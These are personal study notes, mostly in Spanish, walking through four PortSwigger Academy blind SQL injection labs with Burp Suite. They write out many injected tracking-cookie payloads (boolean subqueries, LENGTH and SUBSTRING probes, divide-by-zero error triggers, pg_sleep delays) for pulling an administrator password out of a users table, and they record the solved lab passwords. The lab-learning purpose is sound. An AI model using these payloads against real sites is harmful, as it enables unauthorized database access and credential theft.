

Como usar Burp intruder aqui esta este lab que lo indica muy bien: 

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses


          --> Lab: Blind SQL injection with conditional responses

-> End gol: 

login as the administator user.

-> Steps to follow: 

using a blind sql injection with the trackingID for the cookies look for the table "users"
and then guess using the tables "username" and "password" guess the Administrator password. 

1) Enter the lab, then on the welcome page turn on the foxy proxy 

2) in the welcome page send the url to the repeter and to the burp intruder


-> En el repeter de burp suite esta:

    Cookie: TrackingId=uzXff1VVIKHXZYZZ;

A eso le agregamos: 

Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+'1'%3d'1; 

y si nos devuelve el "Welcome back" message que aparece en el home page del lab 
significa que la pagina es vulnerable a Blind SQL injection. 

3) Luego para usar el repeter y para saber como usar el intruder podemos usar estos pasos: 

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

3.5) Reconocimiento de las tablas: 

Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+LIMIT+1)%3d'a

Agregando esto podemos identificar si hay o no una tabla llamada "users",
el welcome page nos retorna el "welcome Back" message por lo tanto quiere decir que si hay 1 tabla llamada "users"

4) Ahora lo cambiamos a esto: 

Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator')%3d'a

y con esto comprobamos que dentro de la tabla "users" existe el username "administrator"


5) Avergiuando el largo del password: 

Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>1)%3d'a

Con este comando vemos que el largo de "password" es mayor a 1. Luego lo podemos modificar asi: 

Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>2)%3d'a
Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>3)%3d'a

hasta que el "welcome message" desaparece. El largo de la contraseña en este lab es de 20 caracteres. 


6) Aqui debemos usar el intruder de burp suite con este link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

3au9axicawvbbem1f477





        --> Lab: Blind SQL injection with conditional errors

1) Datos y end goal: 

-> La pagina tiene una vulnerabilidad SQL injection que puede ser explotada atravez de las cookies

-> La aplicacion no regresa ningun mensaje independientemente del query que le mandemos. Si el SQL
command causa un error, nos regresara un custome error message. 

-> La pagina contiene una tabla llamada "users" con 2 columnas "username" y "password", necesitamos averiguar la contraseña del 
usuario "Administrador". 

2) URL del lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

3) Usando burp suite y foxy proxy activamos el "internceptor" en la welcome page. Se sabe que el "trackID" de las cookies es vulnerable. 

4) Verificando si es vulenrable a SQL injection: 

En burp suite tenemos el siguente fragmento:

  Cookie: TrackingId=i5Ar0xbNkgVZGzzzYYY;

si le agregamos una ' asi: 

  Cookie: TrackingId=i5Ar0xbNkgVZGzzzYYY';  

y recibimos un 500 error (internal error) es muy probable que esa entrada sea vulnerable a SQL injection. 

5) Verificando indice por indice del "password" del user "administrator" de la tabla "users" genera un SQL error, 
Si la condicion: (username%3d'Administrator'+AND+SUBSTRING(Password,1,1)>'a') es "True" generara el error SQL de "division_by_zero"

Cookie: TrackingId=i5Ar0xbNkgVZGzzzYYY'+AND+(SELECT+CASE+WHEN+(username%3d'Administrator'+AND+SUBSTRING(Password,1,1)>'a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+Users)%3d'a;


6) leer las respuestas del lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:

TrackingId=xyz'||(SELECT '')||'

In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

TrackingId=xyz'||(SELECT '' FROM dual)||'


Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:

TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.


TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'


7) password: o6rsf9a9bxbqx6uudn6j

oo6rsf9a9bxbqx6uudn6j





        --> Lab: Blind SQL injection with time delays


Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. 
La aplicación utiliza una cookie de seguimiento para análisis y realiza 
una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven y la aplicación no 
responde de manera diferente en función de si la consulta devuelve filas o genera un error. 
Sin embargo, dado que la consulta se ejecuta de forma sincrónica, 
es posible activar retardos de tiempo condicionales para inferir información.


Res: TrackingId=ilDeFJte8z85Oyuxz'||pg_sleep(10)--


        --> Lab: Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.


Testeand si es vulnerable a SQL injection: 

TrackingId=8m9g8TZEm69quHzzU'||pg_sleep(5)--;

Se retrasa 5 segundos diciendo que es vulnerable SQL injection Time based.